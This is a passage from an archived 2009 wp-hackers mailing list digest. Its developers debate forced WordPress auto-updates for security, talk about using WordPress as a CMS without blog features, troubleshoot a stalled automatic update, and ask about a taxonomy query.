Unlike operating systems, WordPress runs in many different environments with
many different server setups. Some sites are unable to use the one-click
install. Some sites are highly customised and their owners cannot update
until they apply their customisations to the code. Some people just don't
trust software enough to want to allow it to "own" their system.

Can you imagine the outcry if WP forced an update that crashed a site? There
are loads of users who wouldn't have a clue what to do and those that don't
visit their site every day could end up losing search engine listings,
visitors, and money.

The simple answer is that WordPress *could* do auto updates, but thank
heavens it doesn't.

Lynne

From mikeschinkel at newclarity.net  Thu Oct 22 02:07:41 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Wed, 21 Oct 2009 22:07:41 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <427667db0910211856l783ef8afqd62a66db31d60618@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>
	<e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
	<427667db0910211856l783ef8afqd62a66db31d60618@mail.gmail.com>
Message-ID: <24030D30-A28B-4A21-ABE0-69CA5126056E@newclarity.net>

On Oct 21, 2009, at 9:56 PM, Lynne Pope wrote:
> Can you imagine the outcry if WP forced an update that crashed a  
> site? There
> are loads of users who wouldn't have a clue what to do and those  
> that don't
> visit their site every day could end up losing search engine listings,
> visitors, and money.
>
> The simple answer is that WordPress *could* do auto updates, but thank
> heavens it doesn't.

It's really a shame when one group of people decide what's good for  
everyone else and then block those that want/need it.

WordPress could easily have an "Advanced Options" area that allowed  
auto-update be turned on with full warnings for those who know what  
they are doing.

JMTCW.

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/






From wp-hackers at striderweb.com  Thu Oct 22 02:14:46 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 21:14:46 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <24030D30-A28B-4A21-ABE0-69CA5126056E@newclarity.net>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<ae81acd10910191130u5ed36dcdn68d7ed919ed76325@mail.gmail.com>
	<e1202cb10910191144k51cb40bbidf0edc3209709530@mail.gmail.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>
	<e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
	<427667db0910211856l783ef8afqd62a66db31d60618@mail.gmail.com>
	<24030D30-A28B-4A21-ABE0-69CA5126056E@newclarity.net>
Message-ID: <5519C3CF-4FB8-4CF6-B0E4-5230C39F683E@striderweb.com>


On Oct 21, 2009, at 9:07 PM, Mike Schinkel wrote:

> On Oct 21, 2009, at 9:56 PM, Lynne Pope wrote:
>> Can you imagine the outcry if WP forced an update that crashed a  
>> site? There
>> are loads of users who wouldn't have a clue what to do and those  
>> that don't
>> visit their site every day could end up losing search engine  
>> listings,
>> visitors, and money.
>
> It's really a shame when one group of people decide what's good for  
> everyone else and then block those that want/need it.
>
> WordPress could easily have an "Advanced Options" area that allowed  
> auto-update be turned on with full warnings for those who know what  
> they are doing.

Ironically, I find myself on the exact opposite side of a virtually  
identical argument from earlier today.  Auto-updates may be a great  
idea for some people, but probably not for the vast majority.  It  
could be done with a plugin, and is probably best left to a plugin.

Just my 2 bits.

Stephen

From william.canino at googlemail.com  Thu Oct 22 02:23:08 2009
From: william.canino at googlemail.com (William Canino)
Date: Wed, 21 Oct 2009 22:23:08 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <5519C3CF-4FB8-4CF6-B0E4-5230C39F683E@striderweb.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>
	<e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
	<427667db0910211856l783ef8afqd62a66db31d60618@mail.gmail.com>
	<24030D30-A28B-4A21-ABE0-69CA5126056E@newclarity.net>
	<5519C3CF-4FB8-4CF6-B0E4-5230C39F683E@striderweb.com>
Message-ID: <e4dc67e0910211923t5e7c8a89j56f0cf7631099d9@mail.gmail.com>

> Can you imagine the outcry if WP forced an update that crashed a site? There
> are loads of users who wouldn't have a clue what to do and those that don't
> visit their site every day could end up losing search engine listings,
> visitors, and money.

... as opposed to an attack crashing their site and WP not forcing an
update while it knew about it?

> Methinks there would be some very angry people checking in with
> the WP community to say their website was completely down while they were
> not looking.

... as opposed to an attack crashing their site, eh?

> probably not for the vast majority.  It could be done > with a plugin, and is probably best left to a plugin.

Is it because you think plugins --- most of which are maintained by
one or two people only and who don't use a peer-review VCS --- are
less vulnerable to security holes or attacks?



2009/10/21 Stephen Rider <wp-hackers at striderweb.com>:
>
> On Oct 21, 2009, at 9:07 PM, Mike Schinkel wrote:
>
>> On Oct 21, 2009, at 9:56 PM, Lynne Pope wrote:
>>>
>>> Can you imagine the outcry if WP forced an update that crashed a site?
>>> There
>>> are loads of users who wouldn't have a clue what to do and those that
>>> don't
>>> visit their site every day could end up losing search engine listings,
>>> visitors, and money.
>>
>> It's really a shame when one group of people decide what's good for
>> everyone else and then block those that want/need it.
>>
>> WordPress could easily have an "Advanced Options" area that allowed
>> auto-update be turned on with full warnings for those who know what they are
>> doing.
>
> Ironically, I find myself on the exact opposite side of a virtually
> identical argument from earlier today. ?Auto-updates may be a great idea for
> some people, but probably not for the vast majority. ?It could be done with
> a plugin, and is probably best left to a plugin.
>
> Just my 2 bits.
>
> Stephen
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp-hackers at striderweb.com  Thu Oct 22 02:50:35 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 21:50:35 -0500
Subject: [wp-hackers] wordpress security
In-Reply-To: <e4dc67e0910211923t5e7c8a89j56f0cf7631099d9@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>
	<e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
	<427667db0910211856l783ef8afqd62a66db31d60618@mail.gmail.com>
	<24030D30-A28B-4A21-ABE0-69CA5126056E@newclarity.net>
	<5519C3CF-4FB8-4CF6-B0E4-5230C39F683E@striderweb.com>
	<e4dc67e0910211923t5e7c8a89j56f0cf7631099d9@mail.gmail.com>
Message-ID: <9C44875D-27CE-47C1-8914-27B76A634211@striderweb.com>


On Oct 21, 2009, at 9:23 PM, William Canino wrote:

>> probably not for the vast majority.  It could be done with a  
>> plugin, and is probably best left to a plugin.
>
> Is it because you think plugins --- most of which are maintained by
> one or two people only and who don't use a peer-review VCS --- are
> less vulnerable to security holes or attacks?

No.  It's because I think automatic updates would cause problems for a  
large number of installs, and wouldn't work anyway on a lot of  
installs, and because those who do need it could use a plugin.  Core  
features should be those things that are useful for *most* users.

I'm not to familiar with the Core Update code, but I'm guessing  
there's a core function that could be called to do the job, so  
creating a plugin would just be a matter of triggering that core  
function at the appropriate time.

Stephen


-- 
Stephen Rider
http://striderweb.com/


From wp-hackers at striderweb.com  Thu Oct 22 03:29:07 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 22:29:07 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <e4dc67e0910211550v10941ff0h79044185bb0812b9@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
	<161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>
	<71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>
	<e1202cb10910211458k46c94256jad163d974db1a1f1@mail.gmail.com>
	<e4dc67e0910211550v10941ff0h79044185bb0812b9@mail.gmail.com>
Message-ID: <85ECB219-F7C7-45C4-8DCB-ED862159143A@striderweb.com>


On Oct 21, 2009, at 5:50 PM, William Canino wrote:

> Anyone who'd [use WordPress for a page-only site] penalizes himself  
> with all the software bloat and
> overhead IN WordPress to make feeds, scheduled posts, chronological
> articles, stickies, comments, paged comments, comment feeds, date
> archives, et cetera.  He forces his web server and his readers to
> suffer this burden.

Okay, good point.  Do you perhaps have any pointers as to where/how I  
might deactivate some of this to lighten the load?  Perhaps someone  
could do a patch into core so admins can do things in wp-config.php to  
prevent certain parts of WP from loading.  (Basically a hidden feature  
that does nothing unless you set certain Constants in config?)

Incidentally, if I do make the "Just Pages" plugin, it would certainly  
have options.  For example, maybe you don't need posts, but you want  
comments on pages (or vice versa).  I'm liking the permissions  
approach, as it's likely the most "future proof" method of hiding/ 
turning off this stuff.

As for the "Why", there are a few reasons why I myself would like  
WordPress sans "posts":

	1) Admittedly, there's an aspect of "if all you have is a hammer";  
and I think this applies to a whole lot of people.  I know WordPress  
very well, and as such I can generally look at a given site and say  
"WordPress can do that, and here's how".  The hook system in WordPress  
is extremely well implemented, and you can do a lot of things with it.

	2) The back-end interface is INCREDIBLE.  A design firm recently did  
a web site for the company I work for (day job), and used Drupal.  I  
acknowledge that Drupal may be very flexible, but the back end  
interface is absolutely horrible in comparison to WordPress.  I'm a  
"power user" and I think it's terrible.  I can't *imagine* handing  
this over to someone who is not web-savvy and expecting them to  
maintain/update their own site!  Whereas WordPress I would happily  
hand over to a non-web-savvy person (and have done so-- having first  
said "Um... just ignore all the blog stuff").

	3) The plugin system is better than Drupal as well, IMO. Again, this  
is interface perhaps, but in Drupal you have one page that tells you  
what updates there are, another page (not cross-linked!) for  
activating and deactivating plugins.  Activating plugins is a process  
of guesswork, and many plugins are splintered across the plugin page  
with different pieces here and there with a ton of different  
checkmarks.  In the example of the site that was made for my company  
(which I now get to manage) I know that the designers installed  
plugins that they didn't end up using, but it's very difficult to tell  
which ones they are.  How many plugins are there installed but not  
activated?  This should NOT be a hard question, but it is.

	4) Drupal Themes?  Ditto.  I can't even *find* the templates for  
different pages.  It's not in the "theme" directory, that's for sure.   
The database maybe?  Hard to tell, as there are a gazillion tables in  
the database -- it appears that the system adds an entirely new table  
for each and every custom field... or something.  W. T. F.  (This may  
be a case of the designer horribly misusing Drupal, I suppose -- but  
it appears to be readily possible.  In WordPress you'd have to *work*  
to screw it up this badly.)

	5) Yes, WordPress posts can be used for other things, but if so, I  
would almost rather add a custom "thing" and use that, rather than  
using posts for something they weren't meant for.  (WordPress "post  
types" allows for something very similar to Drupal's "nodes" if only  
the interface were better implemented for it.  I'm pretty sure some  
plugins do this somewhat.)

So the short version is:  WordPress has an *awesome* interface that is  
a pleasure to work with, (*and* code for), and I would proudly present  
that interface to a client.  As such, I want that interface to not  
scream "blog" at the top of its lungs.

(Oh, and yes I know there are other CMSes than Drupal, but again, if  
WordPress can do what I need, why learn several different systems?  I  
would rather master one system than be "okay" with a bunch of them.)

Stephen


-- 
Stephen Rider
http://striderweb.com/


From ajd at cloudiness.com  Thu Oct 22 04:02:40 2009
From: ajd at cloudiness.com (Art Delano)
Date: Thu, 22 Oct 2009 00:02:40 -0400
Subject: [wp-hackers] Wordpress automatic update fail-ish
Message-ID: <B2CCCCC7-B0D0-4DE1-992A-01FF21C0AC4E@cloudiness.com>

I attempted to update a client's site from WP 2.8 to 2.8.5 through the  
automated updater. The updater was stuck for a long time (roughly five  
minutes), so I killed it and replaced the WordPress system manually,  
by FTP.

There are two odd things.

1. Post-FTP, there was no interstitial about updating the database
2. There's a yellow bar on admin pages saying "An automated WordPress  
update has failed to complete - please attempt the update again now".

The site appears to be working normally now; randomly poking at  
various pages and posts doesn't indicate anything's wrong. Aside from  
the yellow bar, is there cause for worry? I'm loathe to try the  
automated update again if it locked up the first time. And I'd like to  
know what's going wrong rather than try bulk-replacing the WordPress  
engine again.

From lynne.pope at gmail.com  Thu Oct 22 04:06:24 2009
From: lynne.pope at gmail.com (Lynne Pope)
Date: Thu, 22 Oct 2009 17:06:24 +1300
Subject: [wp-hackers] wordpress security
In-Reply-To: <24030D30-A28B-4A21-ABE0-69CA5126056E@newclarity.net>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com> 
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com> 
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com> 
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com> 
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com> 
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com> 
	<e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com> 
	<427667db0910211856l783ef8afqd62a66db31d60618@mail.gmail.com> 
	<24030D30-A28B-4A21-ABE0-69CA5126056E@newclarity.net>
Message-ID: <427667db0910212106w640482e0od7a1ba35b76f1991@mail.gmail.com>

2009/10/22 Mike Schinkel <mikeschinkel at newclarity.net>

> On Oct 21, 2009, at 9:56 PM, Lynne Pope wrote:
>
>> Can you imagine the outcry if WP forced an update that crashed a site?
>> There
>> are loads of users who wouldn't have a clue what to do and those that
>> don't
>> visit their site every day could end up losing search engine listings,
>> visitors, and money.
>>
>> The simple answer is that WordPress *could* do auto updates, but thank
>> heavens it doesn't.
>>
>
> It's really a shame when one group of people decide what's good for
> everyone else and then block those that want/need it.
>


Users who need automated updates are already provided for. It's called
wordpress.com

Lynne

From mikeschinkel at newclarity.net  Thu Oct 22 04:12:53 2009
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Thu, 22 Oct 2009 00:12:53 -0400
Subject: [wp-hackers] wordpress security
In-Reply-To: <427667db0910212106w640482e0od7a1ba35b76f1991@mail.gmail.com>
References: <16402dc2.1ca4e74.2324c893.2e40@BrewerRadio.com>
	<161617690910191305j473b0523sdb34032d1f0e3df5@mail.gmail.com>
	<e1202cb10910191324w64c9581ai3904abe45ab3dc0a@mail.gmail.com>
	<161617690910210703m3c9c7ca4h7220432fa50780ec@mail.gmail.com>
	<F4788A54-736B-44C6-A7A8-CB50E9EC2679@striderweb.com>
	<161617690910211340n128f5b52m24fe971040d57a47@mail.gmail.com>
	<e1202cb10910211559m3b23df80w56f69c6b1ef340e1@mail.gmail.com>
	<e4dc67e0910211813n818a97u28e7010849a90568@mail.gmail.com>
	<427667db0910211856l783ef8afqd62a66db31d60618@mail.gmail.com>
	<24030D30-A28B-4A21-ABE0-69CA5126056E@newclarity.net>
	<427667db0910212106w640482e0od7a1ba35b76f1991@mail.gmail.com>
Message-ID: <0D87FF5F-0FA8-4199-BAE6-BC9C0A8F1FF3@newclarity.net>

On Oct 22, 2009, at 12:06 AM, Lynne Pope wrote:
> Users who need automated updates are already provided for. It's called
> wordpress.com

You so snarky.  :-p

-Mike Schinkel
WordPress Custom Plugins
http://mikeschinkel.com/custom-wordpress-plugins/







From wp-hackers at striderweb.com  Thu Oct 22 04:20:59 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Wed, 21 Oct 2009 23:20:59 -0500
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <161617690910211431k16166ef2m28544bc8b62e49b6@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>
	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>
	<161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>
	<71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>
	<161617690910211431k16166ef2m28544bc8b62e49b6@mail.gmail.com>
Message-ID: <5CF1FB8E-5500-43F6-910C-57D65B6F0A1B@striderweb.com>


On Oct 21, 2009, at 4:31 PM, Otto wrote:

> WordPress won't be good at static sites for until somebody comes along
> and actually fixes all those bits up. Because of this, it's going to
> be pretty poor at being a "traditional" CMS in the static site sense.
>
> Now, it is getting better. The recent updates to add custom post type
> taxonomies is a decent start.

For the record, I think he's referring to this: <http://core.trac.wordpress.org/ticket/9674 
 >.  Hopefully this will make 2.9.  If not, 3.0?


> <snip> Anyway, once things are made generic, then interfaces can be  
> made for
> them. You'll be able to drag and drop a comments section onto the page
> you want, or not, or whatever. And it'll be neat.
>
> But that day isn't quite today. It's not up for it yet. WordPress is
> indeed a CMS, but that depends on how you actually define "CMS". If
> you think "Content Management System", then that's true, but if you
> think that means every type of "content" under the sun, then you've
> still got another think, I'd say.

I suppose that in a way this discussion is an attempt to push it in  
that direction, and in that sense you don't disagree with us as much  
as you think. ;-)

Overall this is a great post, Otto. I agree with a lot of it you say,  
but I tihnk you're just a bit pessimistic about what can be done  
*today*.  The trac ticket I reference above is important, and appears  
to be a big first step toward where we would both like to see  
WordPress go.

> In the meantime, it makes a damn fine "blog" system, and I'd advice
> people to stick with that. If they want to help make it more generic,
> then I'd work on those bits. Post taxonomies is the next big thing
> that needs that sort of work.

It's the best blog system out there.  I just see the potential, even  
in its present state, to do other things very well; and that's where  
I'm trying to go.

Off to bed....

Stephen

-- 
Stephen Rider
http://striderweb.com/


From mark at watero.us  Thu Oct 22 04:57:17 2009
From: mark at watero.us (mark waterous)
Date: Wed, 21 Oct 2009 21:57:17 -0700
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <e4dc67e0910211550v10941ff0h79044185bb0812b9@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>	<161617690910211347j9390557hfd03266d9a2ae40d@mail.gmail.com>	<666eb9f0910211357r7fd9d33dqf29718ce350c7050@mail.gmail.com>	<161617690910211407p47537d61o9c08ab8aa0132198@mail.gmail.com>	<71ddd7490910211415p5d14c853v58a7ed6cc6f95368@mail.gmail.com>	<e1202cb10910211458k46c94256jad163d974db1a1f1@mail.gmail.com>
	<e4dc67e0910211550v10941ff0h79044185bb0812b9@mail.gmail.com>
Message-ID: <000a01ca52d4$21feede0$65fcc9a0$@us>

> From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-
> bounces at lists.automattic.com] On Behalf Of William Canino
> Sent: Wednesday, October 21, 2009 3:50 PM
> Subject: Re: [wp-hackers] WordPress as CMS (was: wordpress security)
> 
> I think using WordPress 2.8.4 as a CMS is like using a coffeemaker to
> boil vegetables.  Office pantries probably don't have a stove or
> cookware, but they all have a coffeemaker. And everyone knows how to
> use a coffeemaker, right?  Yes, WordPress 2.8.4 as a CMS is a
> MacGyverism.

Personally, I like Ozh's take on this;
http://planetozh.com/blog/2009/09/the-definitive-guide-to-using-wordpress-as
-a-cms/

Your analogy does make sense, but it's a little broader than that, isn't it?
When you say 'Coffee', everybody knows that you mean that black substance
(of varying thickness) that helps some people stay up late and get work
done, and others maintain a constant state of vibration. When you say 'CMS',
or Content Management System, you can't pigeon hole the coffee pot that
makes your content. Wordpress IS a CMS. It manages content. Plain and
simple. It may not offer the same features as some other CMS' do, but that
doesn't mean it's not a kitchen utensil, just like Drupal or Joomla. It's
just a different kitchen utensil.

As I alluded to (maybe I didn't?) in my earlier post to the thread, I agree
with everybody saying that changing the naming conventions currently being
used is more important than stripping available functionality. I couldn't in
my wildest dreams envision the desire to remove my Posts ability.
-Mark




From raven at mecus.es  Thu Oct 22 06:19:03 2009
From: raven at mecus.es (Rafael Poveda - RaveN)
Date: Thu, 22 Oct 2009 08:19:03 +0200
Subject: [wp-hackers] WordPress as CMS (was: wordpress security)
In-Reply-To: <862d087f0910211305i1b0a32eaga4574713316419ec@mail.gmail.com>
References: <7A5AABD5-6E6E-4AE9-8976-001EB6F52342@striderweb.com>
	<862d087f0910211305i1b0a32eaga4574713316419ec@mail.gmail.com>
Message-ID: <CC20CA8C-D1EF-47F6-BA34-5BE6730FACEC@mecus.es>

In my company we just change the name of the things (our own .mo) to  
be more comprehensive to our users.

Aso someone said, WordPress IS a CMS with blog nomenclature. Just  
change it, no plugins needed. Just two special .mo.

El 21/10/2009, a las 22:05 , Nathan Rice escribi?:

> You're most likely about to be told either:
>
> 1) If you want a website CMS (non-blog) then try drupal/joomla/EE
> 2) If you MUST use WP as a site CMS (non-blog) just tell your client  
> to
> ignore the blog stuff.
>
> Good luck.
>
> FWIW, I like the idea of a lightweight plugin that does nothing but  
> remove
> all references to blog posts, comments, etc. I think it's a fine idea.
>
> ------------------
> Nathan Rice
> WordPress and Web Development
> www.nathanrice.net | twitter.com/nathanrice | www.modthemes.com
>
>
> On Wed, Oct 21, 2009 at 4:00 PM, Stephen Rider <wp-hackers at striderweb.com 
> >wrote:
>
>> Note:  This email repeats a lot of things I said in another email,  
>> for the
>> benefit of those who are not following the Security thread.  For  
>> those who
>> *are* following that thread, please skim to the bottom, as I pose a  
>> new and
>> separate question from the security issues discussed elsewhere....
>>
>> On Oct 21, 2009, at 9:03 AM, Otto wrote:
>>
>> A site that the admin has not visited in 2 months is, IMO, a dead
>>> site. No new content, no readers, nobody caring for it...
>>>
>>
>> In the past, I've asked for advice on using WordPress as a straight  
>> CMS
>> rather than a blog platform.  Such questions are routinely answered  
>> with
>> remarks along the lines of, "It is a CMS, Dummy."
>>
>> Fine it's a CMS.  But as such we must accept that many users are  
>> using
>> WordPress to set up their sites, and edit them when needed, but are  
>> NOT
>> routinely adding new content, /a la/ a blog.  In such  
>> circumstances, a site
>> can **easily** go two months without being updated.
>>
>> I just don't understand this "screw 'em" attitude.  The attitude  
>> toward
>> people asking about "WordPress as CMS" is widespread and wrongheaded
>> (including coming from one developer with whom I've had a very  
>> friendly
>> relationship.)  As long as the "blog post" aspect is front and  
>> center,
>> people will -- legitimately -- consider it "blog software".
>>
>> Personally I would love to see a plugin that entirely removes or  
>> conceals
>> the post/comment areas of the admin, and I'm considering making one.
>>
>> The Big Question:  What would a "CMS" plugin have to do?  Pots and  
>> comments
>> are woven throughout the Admin, and I'd like to remove all aspects  
>> of them
>> from the menus.  My "to do" list is below -- if I'm missing  
>> something, or if
>> you have advice as to how to do some of this, I would appreciate.
>>
>>       1) Remove "Posts" and "Comments" from main menu.  (Am I  
>> correct that
>> direct links will still work?  Is there a way to remove those areas  
>> entirely
>> rather than just hiding the menu items?)
>>
>>       2) Remove "Recent Comments" and "QuickPress" from Dashboard.
>> (Again, can it be removed entirely or merely hidden?)
>>
>>       3) Remove "Press This" from Tools page (how?)
>>
>>       4) Writing Settings page -- remove/hide/turn off "Remote
>> Publishing", "Post Via Email", and "Update Services" settings
>>
>>       5) Reading Settings page -- remove "Front Page Displays"  
>> option.
>> Set it to "static page".  Still must allow user to set the static  
>> page
>> though.
>>
>>       (Since we're changing those two pages so much, perhaps remove  
>> them
>> entirely and replace them with a new consolidated page?)
>>
>>       6) Remove "Discussion" settings page entirely.  Set default
>> preferences to no comments or notifications.
>>
>>       7) Remove "Discussion" meta box from Edit Page page.
>>
>>       8) Remove Tags/Categories from Permalink Settings page
>>
>> Also, in general, I think WordPress itself should do a few things  
>> to lessen
>> the "blog assumption".  Nothing major, but a few small things to  
>> consider:
>>
>>       1) On General Settings page, change "Blog Title" and "Blog  
>> Address"
>> to "Site Title" and "Site Address"
>>
>>       2) Ditto "Privacy" page.  "Blog" s/b "Site"
>>
>> Good idea?  Bad?  Discuss!
>>
>> Stephen
>>
>> --
>> Stephen Rider
>> http://striderweb.com/
>>
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

--
Rafael Poveda <RaveN> | Mecus.es
raven at mecus.es | raven at raven.es
gtalk: rafael.poveda





From mike at zed1.com  Thu Oct 22 08:45:00 2009
From: mike at zed1.com (Mike Little)
Date: Thu, 22 Oct 2009 09:45:00 +0100
Subject: [wp-hackers] static websites - was: wordpress security
In-Reply-To: <d7153760910211708o5f045ff7qf281a4faf2c732e6@mail.gmail.com>
References: <cfd69f2e0910211630tb32709dlf89fd330b83cd5a6@mail.gmail.com> 
	<d7153760910211647q2850e0f4qe07df6374f4e4029@mail.gmail.com> 
	<1256168909.4632.19.camel@rillian.narnia.sunriseroad.net> 
	<d7153760910211708o5f045ff7qf281a4faf2c732e6@mail.gmail.com>
Message-ID: <7235ce780910220145l239af35fs85870740ce58d443@mail.gmail.com>

2009/10/22 mccormicky <mccormicky at gmail.com>

> The plugin  ".html on pages"  works on static pages. I've tried it and it
> does work.
>
>
>
This one -  http://wordpress.org/extend/plugins/html-on-pages/



Mike

-- 
Mike Little
http://zed1.com/

From mccormicky at gmail.com  Thu Oct 22 09:37:19 2009
From: mccormicky at gmail.com (mccormicky)
Date: Thu, 22 Oct 2009 05:37:19 -0400
Subject: [wp-hackers] Wordpress automatic update fail-ish
In-Reply-To: <B2CCCCC7-B0D0-4DE1-992A-01FF21C0AC4E@cloudiness.com>
References: <B2CCCCC7-B0D0-4DE1-992A-01FF21C0AC4E@cloudiness.com>
Message-ID: <d7153760910220237l3d1b0ba6ie290c3cc8b0e916f@mail.gmail.com>

This happens to me on a lot of the sites I maintain.
Next time instead of killing the whole upgrade  you can check the timestamps
of the files -- Most FTP clients show the changed timestamp.
Because I think stopping the upgrade during  upgrade generates the failure
nag.


When you choose auto upgrade are you 1st directed to choose SSL FTP or FTP?
Only happens on 2 sites/servers, so just curious as to why not all.

On Thu, Oct 22, 2009 at 12:02 AM, Art Delano <ajd at cloudiness.com> wrote:

> I attempted to update a client's site from WP 2.8 to 2.8.5 through the
> automated updater. The updater was stuck for a long time (roughly five
> minutes), so I killed it and replaced the WordPress system manually, by FTP.
>
> There are two odd things.
>
> 1. Post-FTP, there was no interstitial about updating the database
> 2. There's a yellow bar on admin pages saying "An automated WordPress
> update has failed to complete - please attempt the update again now".
>
> The site appears to be working normally now; randomly poking at various
> pages and posts doesn't indicate anything's wrong. Aside from the yellow
> bar, is there cause for worry? I'm loathe to try the automated update again
> if it locked up the first time. And I'd like to know what's going wrong
> rather than try bulk-replacing the WordPress engine again.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at dd32.id.au  Thu Oct 22 10:23:21 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 22 Oct 2009 21:23:21 +1100
Subject: [wp-hackers] Taxnomy Q: All categories (posts>0) with posts in term
 X of another taxonomy
Message-ID: <op.u165s2q2spxmuu@dd32.no-ip.com>

Hi All,
I'm looking for a function which I'm pretty sure isnt offered by  
WordPress's Taxonomy system, Yet it seems to be something a few people  
might need.. So i'm putting a call out to see if anyone has any ideas?  
(ie. pre-written code they'd like to share..)

What i'm basically wanting, Is to find out the list of categories with  
posts > 0 which exist in term X of another taxonomy..

An example, Would be, Find all categories with more than 0 posts which are  
contained within the tag 'SomeTag'

I'm certain theres a easy SQL for this, But I dont really have the time to  
dive into it right now.. And caching would also be an issue (Given this is  
a list that'll be displayed on every page load, I'll probably just  
transient the results..)

Any thoughts or hints from anyone to save me some time?

Cheers
Dion Hulse

e: contact at dd32.id.au
w: http://dd32.id.au
WordPressQI: http://wordpressqi.com/

From if.website at gmail.com  Thu Oct 22 10:43:57 2009
From: if.website at gmail.com (Austin Matzko)
Date: Thu, 22 Oct 2009 05:43:57 -0500
Subject: [wp-hackers] Taxnomy Q: All categories (posts>0) with posts in
	term X of another taxonomy
In-Reply-To: <op.u165s2q2spxmuu@dd32.no-ip.com>
References: <op.u165s2q2spxmuu@dd32.no-ip.com>
Message-ID: <674b4a3b0910220343o3e4ffea9n54b6d0a700066fa8@mail.gmail.com>

On Thu, Oct 22, 2009 at 5:23 AM, Dion Hulse (dd32) <wordpress at dd32.id.au> wrote:
> I'm looking for a function which I'm pretty sure isnt offered by WordPress's
> Taxonomy system, Yet it seems to be something a few people might need.. So
> i'm putting a call out to see if anyone has any ideas? (ie. pre-written code
> they'd like to share..)
>
> What i'm basically wanting, Is to find out the list of categories with posts
>> 0 which exist in term X of another taxonomy..
>
> An example, Would be, Find all categories with more than 0 posts which are
